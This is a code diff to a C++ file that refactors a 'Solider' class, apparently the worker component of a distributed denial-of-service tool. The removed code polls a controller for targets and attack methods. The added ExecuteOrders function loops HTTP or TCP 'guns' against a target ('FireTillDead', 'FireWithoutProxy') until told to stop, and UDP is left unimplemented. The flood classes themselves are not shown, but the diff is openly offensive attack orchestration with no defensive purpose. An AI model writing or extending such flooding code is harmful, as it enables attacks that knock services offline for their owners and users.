@@ -5,50 +5,32 @@
 #include "api_interface.h"
 #include "globals.h"
 
-void Solider::operator()() noexcept
+void Solider::ExecuteOrders(const TaskController &task, Informator::AttackMethod method, Attackers::Target target)
 {
-	Informator informer;
-	while(!g_shouldStop.load())
+	switch (method)
 	{
-		std::cout << "Loading new response" << std::endl;
-		while(!informer.LoadNewData())
+		case Informator::AttackMethod::HTTPAttack:
 		{
-		}
-
-		std::cout << "Getting target" << std::endl;
-		const auto targetURI = informer.GetTarget();
-		if(!targetURI)
-		{
-			continue;
-		}
-
-		std::cout << "Choosing method for: " << *targetURI << std::endl;
-		if(const auto method{informer.GetMethod()})
-		{
-			std::unique_ptr<Attackers::IGun> currentGun;
-			switch(*method)
+			Attackers::HTTPGun http{task};
+			while(!task.ShouldStop())
 			{
-				case Informator::AttackMethod::HTTPAttack:
-				{
-					currentGun.reset(new Attackers::HTTPGun());
-					break;
-				}
-				case Informator::AttackMethod::TCPAttack:
-				{
-					currentGun.reset(new Attackers::TCPGun());
-					break;
-				}
-				case Informator::AttackMethod::UDPAttack:
-				{
-					continue;
-				}
+				http.FireTillDead({target.address, 0});
 			}
+			break;
+		}
+		case Informator::AttackMethod::TCPAttack:
+		{
+			Attackers::TCPGun tcp{task};
 
-			if(const auto target{currentGun->Aim(*targetURI)})
+			while(!task.ShouldStop())
 			{
-				std::cout << "Got aim, firing" << std::endl;
-				currentGun->FireTillDead(*target);
+				tcp.FireWithoutProxy(target);
 			}
+			break;
+		}
+		case Informator::AttackMethod::UDPAttack:
+		{
+			throw std::runtime_error("Not implemented");
 		}
 	}
 }
